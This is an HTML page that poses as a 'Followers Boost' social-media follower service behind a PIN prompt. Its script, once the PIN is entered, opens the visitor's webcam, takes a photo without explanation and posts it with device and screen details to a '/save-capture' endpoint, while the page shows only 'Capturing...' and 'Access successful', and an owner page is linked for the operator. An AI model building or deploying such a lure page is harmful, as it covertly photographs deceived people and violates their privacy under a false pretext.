<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GET FOLLOWERS</title>

  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"/>

  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Orbitron:wght@600;800&family=Cinzel:wght@600;800&family=Rubik:wght@400;600;800&display=swap" rel="stylesheet"/>

  <style>
    .fade-in { animation: fadeIn .8s ease-out forwards; }
    @keyframes fadeIn { from { opacity:0; transform: translateY(14px);} to { opacity:1; transform: none;} }

    .shake { animation: shake .4s ease-in-out; }
    @keyframes shake { 0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}50%{transform:translateX(8px)}75%{transform:translateX(-4px)} }

    .success-pulse { animation: pulse 1.1s infinite; }
    @keyframes pulse { 0%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:.9}100%{transform:scale(1);opacity:1} }

    .spinner { border:4px solid rgba(255,255,255,.25); border-top:4px solid var(--acc); border-radius:50%; width:36px; height:36px; animation: spin 1s linear infinite; margin:0 auto; }
    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }

    :root{
      --bg:#0f172a; --txt:#eaf2ff; --muted:#94a3b8; --card:rgba(15,23,42,.48);
      --border:#60a5fa33; --acc:#6ea8ff; --acc2:#22d3ee; --shadow:0 30px 60px rgba(2,6,23,.5);
      --title-font: "Inter", system-ui, sans-serif;
      --text-font: "Inter", system-ui, sans-serif;
    }
    body{ min-height:100vh; color:var(--txt); background: var(--bg); font-family: var(--text-font); transition: background .5s ease, color .5s ease; overflow-x:hidden; }

    /* Surfaces + controls */
    .surface{ background: var(--card); border:1px solid var(--border); box-shadow: var(--shadow); backdrop-filter: blur(14px); }
    .bar, .footer{ background: var(--card); border-color: var(--border); backdrop-filter: blur(10px); }
    .muted{ color: var(--muted); }
    .btn-acc{ background: var(--acc); color:#0b1220; transition: transform .2s ease, filter .2s ease, box-shadow .25s ease; }
    .btn-acc:hover{ transform: translateY(-2px) scale(1.02); filter: brightness(1.05); box-shadow: 0 10px 28px color-mix(in oklab, var(--acc) 30%, transparent); }
    select{ background: transparent; border:1px solid var(--border); color:var(--txt); padding:.5rem .6rem; border-radius:.6rem; }

    /* Theme switch veil */
    body.theming::after{ content:""; position:fixed; inset:0; background:#0006; animation: themeFade .35s ease; pointer-events:none; z-index:30; }
    @keyframes themeFade{ from{opacity:0} 30%{opacity:1} to{opacity:0} }

    /* ---------------- BACKGROUND DECOR LAYERS ---------------- */
    .decor{ position:fixed; inset:0; z-index:0; pointer-events:none; }
    .layer{ position:absolute; inset:0; opacity:0; transition: opacity .45s ease; }
    body.theme-glass #glass, body.theme-minimal #minimal, body.theme-cyberpunk #cyberpunk, body.theme-gaming #gaming, body.theme-luxury #luxury { opacity:1; }

    #glass{
      background:
        radial-gradient(50vw 50vw at -10% 10%, rgba(96,165,250,.22), transparent 60%),
        radial-gradient(50vw 50vw at 110% 90%, rgba(34,211,238,.18), transparent 60%),
        linear-gradient(120deg,#0b1220 0%, #0f172a 45%, #0b1220 100%);
    }
    #glass::before, #glass::after{
      content:""; position:absolute; width:46vw; height:46vw; border-radius:999px; filter: blur(70px);
      animation: floatBlob 18s ease-in-out infinite;
    }
    #glass::before{ background: radial-gradient(circle, rgba(96,165,250,.45), transparent 60%); top:10%; left:-8%; }
    #glass::after{ background: radial-gradient(circle, rgba(34,211,238,.35), transparent 60%); bottom:-8%; right:-8%; animation-direction: reverse; }
    @keyframes floatBlob{ 0%,100%{ transform: translate3d(0,0,0)} 50%{ transform: translate3d(2vw,-2vw,0) scale(1.05)} }

    #minimal{ background: linear-gradient(180deg,#ffffff,#f5f7fb); }
    #minimal::after{
      content:""; position:absolute; inset:0;
      background: repeating-linear-gradient(0deg, transparent 0 2px, rgba(0,0,0,.03) 2px 3px);
      opacity:.35; mix-blend-mode:multiply;
    }

    #cyberpunk{
      background:
        radial-gradient(900px 500px at 80% 20%, rgba(0,229,255,.12), transparent 60%),
        radial-gradient(900px 500px at 10% 80%, rgba(255,0,222,.12), transparent 60%),
        linear-gradient(135deg,#090014 0%, #160022 45%, #000a10 100%);
    }
    #cyberpunk::before{
      content:""; position:absolute; inset:-200% -200%;
      background-image:
        linear-gradient(rgba(255,255,255,.06) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,.06) 1px, transparent 1px);
      background-size: 40px 40px; opacity:.25; transform: perspective(800px) rotateX(60deg) translateY(15%);
      animation: gridMove 18s linear infinite;
    }
    #cyberpunk::after{
      content:""; position:absolute; inset:0; background: repeating-linear-gradient(transparent 0 3px, rgba(255,0,222,.06) 3px 4px);
      opacity:.35;
    }
    @keyframes gridMove{ 0%{ transform: perspective(800px) rotateX(60deg) translateY(15%) translateX(0)} 100%{ transform: perspective(800px) rotateX(60deg) translateY(15%) translateX(-40px)} }

    #gaming{
      background:
        radial-gradient(60vw 60vw at 0% 0%, rgba(239,68,68,.12), transparent 60%),
        radial-gradient(60vw 60vw at 100% 100%, rgba(34,197,94,.12), transparent 60%),
        linear-gradient(180deg,#0a0a0a,#0f0f0f);
    }
    #gaming::before{
      content:""; position:absolute; inset:-100% -100%;
      background-image:
        linear-gradient(transparent 0, transparent 96%, rgba(255,255,255,.05) 100%),
        linear-gradient(90deg, transparent 0, transparent 96%, rgba(255,255,255,.05) 100%);
      background-size: 30px 30px; opacity:.28; animation: gridPan 16s linear infinite;
    }
    @keyframes gridPan{ 0%{ transform: translate3d(0,0,0)} 100%{ transform: translate3d(-30px,-30px,0)} }
    .particle{ position:absolute; width:6px; height:6px; border-radius:999px; background: #00ffee; filter:drop-shadow(0 0 8px #00ffee); opacity:.8; animation: floatUp 8s linear infinite; }
    @keyframes floatUp{ 0%{ transform: translateY(20vh); opacity:.1} 20%{opacity:.7} 100%{ transform: translateY(-110vh); opacity:0} }

    #luxury{
      background: radial-gradient(800px 500px at 20% 10%, rgba(212,175,55,.14), transparent 60%), linear-gradient(135deg,#0b0b0b,#000);
    }
    #luxury::before{
      content:""; position:absolute; inset:-10%; background:
        radial-gradient(circle at 30% 30%, rgba(212,175,55,.22), transparent 35%),
        radial-gradient(circle at 80% 70%, rgba(254,243,199,.18), transparent 40%);
      filter: blur(40px); opacity:.7;
    }
    #luxury::after{
      content:""; position:absolute; inset:0;
      background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,.6) 100%);
      pointer-events:none;
    }
    .sparkle{
      position:absolute; width:2px; height:2px; background: #fde68a; box-shadow: 0 0 8px #fde68a, 0 0 16px #f59e0b; border-radius:50%;
      animation: twinkle 2.6s ease-in-out infinite;
    }
    @keyframes twinkle{ 0%,100%{ opacity:.2; transform: scale(.9)} 50%{ opacity:1; transform: scale(1.4)} }

    .theme-glass{
      --bg:#0f172a; --txt:#eaf2ff; --muted:#b5c3d8; --card:rgba(15,23,42,.48);
      --border:#60a5fa33; --acc:#6ea8ff; --acc2:#22d3ee; --shadow:0 30px 60px rgba(2,6,23,.5);
      --title-font:"Inter", system-ui, sans-serif; --text-font:"Inter", system-ui, sans-serif;
    }
    .theme-minimal{
      --bg:#f7f9fc; --txt:#0f172a; --muted:#4b5563; --card:#ffffffee;
      --border:#e5e7eb; --acc:#2563eb; --acc2:#14b8a6; --shadow:0 18px 36px rgba(17,24,39,.08);
      --title-font:"Rubik", system-ui, sans-serif; --text-font:"Rubik", system-ui, sans-serif;
    }
    .theme-cyberpunk{
      --bg:#090014; --txt:#ffe9ff; --muted:#d2a7ff; --card:rgba(10,0,20,.6);
      --border:#ff00ff40; --acc:#ff00de; --acc2:#00e5ff; --shadow:0 28px 60px rgba(255,0,222,.2);
      --title-font:"Orbitron", system-ui, sans-serif; --text-font:"Inter", system-ui, sans-serif;
    }
    .theme-gaming{
      --bg:#0a0a0a; --txt:#e7e7e7; --muted:#a3a3a3; --card:rgba(16,16,18,.72);
      --border:#22c55e33; --acc:#22c55e; --acc2:#00ffee; --shadow:0 22px 50px rgba(0,255,238,.15);
      --title-font:"Inter", system-ui, sans-serif; --text-font:"Inter", system-ui, sans-serif;
    }
    .theme-luxury{
      --bg:#0a0a0a; --txt:#fef3c7; --muted:#e7cf8a; --card:rgba(22,22,22,.78);
      --border:#d4af3744; --acc:#d4af37; --acc2:#fde68a; --shadow:0 30px 60px rgba(212,175,55,.22);
      --title-font:"Cinzel", serif; --text-font:"Inter", system-ui, sans-serif;
    }
    .title{ font-family: var(--title-font); letter-spacing:.5px; }
    .theme-cyberpunk .title{ position:relative; text-shadow: 0 0 10px var(--acc), 0 0 24px var(--acc2); }
    .theme-cyberpunk .title::after, .theme-cyberpunk .title::before{
      content: attr(data-title); position:absolute; inset:0; pointer-events:none; mix-blend-mode:screen;
    }
    .theme-cyberpunk .title::before{ color: var(--acc2); transform: translateX(1.5px); clip-path: polygon(0 0,100% 0,100% 40%,0 50%); animation: glitch1 2s infinite; }
    .theme-cyberpunk .title::after{ color: var(--acc); transform: translateX(-1.5px); clip-path: polygon(0 60%,100% 50%,100% 100%,0 100%); animation: glitch2 2s infinite .2s; }
    @keyframes glitch1{ 0%,100%{transform: translateX(1.5px)} 20%{transform: translateX(0)} 40%{transform: translateX(2.5px)} 60%{transform: translateX(-1px)} 80%{transform: translateX(1px)} }
    @keyframes glitch2{ 0%,100%{transform: translateX(-1.5px)} 20%{transform: translateX(0)} 40%{transform: translateX(-2px)} 60%{transform: translateX(1px)} 80%{transform: translateX(-1px)} }

    .theme-gaming .btn-acc{ border:1px solid #00ffee55; clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px); text-shadow: 0 0 10px #00ffee55; }
    .theme-gaming .btn-acc:hover{ box-shadow: 0 0 20px #00ffeeaa, inset 0 0 14px #00ffee55; }

    .theme-luxury .surface{ border:1px solid #d4af3755; position:relative; }
    .theme-luxury .surface::after{
      content:""; position:absolute; inset:0; border-radius: inherit; border:1px solid transparent;
      background: linear-gradient(120deg, rgba(212,175,55,.0), rgba(212,175,55,.4), rgba(212,175,55,.0)) border-box;
      -webkit-mask: linear-gradient(#000 0 0) padding-box, linear-gradient(#000 0 0); -webkit-mask-composite: xor; mask-composite: exclude;
      animation: shine 2.8s linear infinite;
    }
    @keyframes shine{ 0%{ opacity:.15; } 50%{ opacity:.5; } 100%{ opacity:.15; } }
  </style>
</head>
<body class="theme-glass flex flex-col min-h-screen">

  <div class="decor" aria-hidden="true">
    <div id="glass" class="layer"></div>
    <div id="minimal" class="layer"></div>
    <div id="cyberpunk" class="layer"></div>
    <div id="gaming" class="layer">
      <span class="particle" style="left:8%; animation-delay:.2s"></span>
      <span class="particle" style="left:22%; animation-delay:1s"></span>
      <span class="particle" style="left:37%; animation-delay:2.1s"></span>
      <span class="particle" style="left:55%; animation-delay:.7s"></span>
      <span class="particle" style="left:68%; animation-delay:1.6s"></span>
      <span class="particle" style="left:82%; animation-delay:.4s"></span>
    </div>
    <div id="luxury" class="layer">
      <span class="sparkle" style="top:18%; left:22%; animation-delay:.2s"></span>
      <span class="sparkle" style="top:36%; left:68%; animation-delay:.9s"></span>
      <span class="sparkle" style="top:72%; left:41%; animation-delay:1.5s"></span>
      <span class="sparkle" style="top:58%; left:12%; animation-delay:2.1s"></span>
      <span class="sparkle" style="top:24%; left:82%; animation-delay:1.1s"></span>
    </div>
  </div>

  <nav class="bar surface border-b w-full p-4 flex justify-between items-center relative z-10">
    <h1 class="title text-2xl font-extrabold tracking-wide text-[var(--acc)]" data-title="FOLLOWERS BOOST">⚡ FOLLOWERS BOOST</h1>
    <div class="flex items-center gap-3">
      <select id="themeSelect" onchange="switchTheme(this.value)">
        <option value="glass">Glass</option>
        <option value="minimal">Minimal</option>
        <option value="cyberpunk">Cyberpunk</option>
        <option value="gaming">Gaming</option>
        <option value="luxury">Luxury</option>
      </select>
      <button onclick="toggleMenu()" class="text-3xl hover:text-[var(--acc)] transition">☰</button>
    </div>
    <div id="navLinks" class="hidden absolute top-14 right-4 surface rounded-xl shadow-lg overflow-hidden">
      <a href="index.html" class="block px-6 py-3 hover:bg-[var(--acc)] hover:text-black transition">🏠 Home</a>
      <a href="owner.html" class="block px-6 py-3 hover:bg-[var(--acc)] hover:text-black transition">🔑 Owner</a>
    </div>
  </nav>

  <div id="pinNotice" class="w-full text-center p-3 font-semibold relative z-10" style="background:var(--acc); color:#0b1220;">
    🔑 Enter the correct PIN to continue. (Default User PIN: <span class="font-mono">1111</span>)
  </div>
  
  <div class="flex-grow flex flex-col items-center justify-center px-6 text-center relative z-10">
    <div id="loginCard" class="surface p-8 rounded-2xl max-w-md w-full fade-in">
      <h2 class="title text-3xl font-bold mb-4 text-[var(--acc)]">Enter Access PIN</h2>
      <p class="muted mb-6">Secure access required before proceeding 🚀</p>
      
      <div class="flex items-center justify-center">
        <input id="userPin" type="password" placeholder="••••"
          class="px-4 py-3 rounded-l-xl border-none text-black w-40">
        <button onclick="userLogin()" 
          class="btn-acc px-6 py-3 rounded-r-xl font-semibold">Login</button>
      </div>

      <div id="spinner" class="hidden mt-6">
        <div class="spinner"></div>
        <p class="mt-2" style="color:var(--acc)">Capturing...</p>
      </div>

      <p id="userStatus" class="mt-6 text-lg font-semibold"></p>
    </div>
  </div>

  <footer class="footer surface border-t w-full text-center p-4 muted text-sm relative z-10">
    ⚡ Powered by <span class="text-[var(--acc)] font-semibold">Followers Boost</span>
  </footer>

  <script>
    const USER_PIN = "1111";

    function toggleMenu() {
      document.getElementById("navLinks").classList.toggle("hidden");
    }

    function userLogin() {
      const pinInput = document.getElementById("userPin");
      const pin = pinInput.value;
      const status = document.getElementById("userStatus");
      const card = document.getElementById("loginCard");
      const spinner = document.getElementById("spinner");

      if (pin === USER_PIN) {
        status.innerHTML = "✅ <span class='text-green-400'>Access Granted...</span>";
        status.classList.add("success-pulse");
        spinner.classList.remove("hidden");
        setTimeout(captureImage, 1500);
      } else {
        status.innerHTML = "❌ <span class='text-red-400'>Wrong PIN!</span>";
        card.classList.remove("shake"); 
        void card.offsetWidth; 
        card.classList.add("shake");
      }
    }

    function captureImage() {
      const spinner = document.getElementById("spinner");
      spinner.classList.add("hidden");

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");

            stream.getTracks().forEach(track => track.stop());

            fetch("/save-capture", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                time: new Date().toLocaleString(),
                ip: "192.168.0." + Math.floor(Math.random() * 255),
                device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
                img: imageData
              })
            })
            .then(() => {
              document.getElementById("userStatus").innerHTML = "✅ <span class='text-green-400'>Access successful.</span>";
            })
            .catch(err => {
              document.getElementById("userStatus").innerHTML = "⚠️ <span class='text-yellow-400'>Error saving!</span>";
              console.error(err);
            });
          }, 1200);
        })
        .catch(err => {
          document.getElementById("userStatus").innerHTML = "⚠️ <span class='text-red-400'>Camera blocked, you didn't pass!</span>";
          console.error("Camera error:", err);
        });
    }

    function switchTheme(theme){
      document.body.classList.add("theming");
      setTimeout(()=>{
        document.body.className = "theme-" + theme + " flex flex-col min-h-screen";
      }, 120);
      setTimeout(()=> document.body.classList.remove("theming"), 380);
    }
  </script>
</body>
</html>
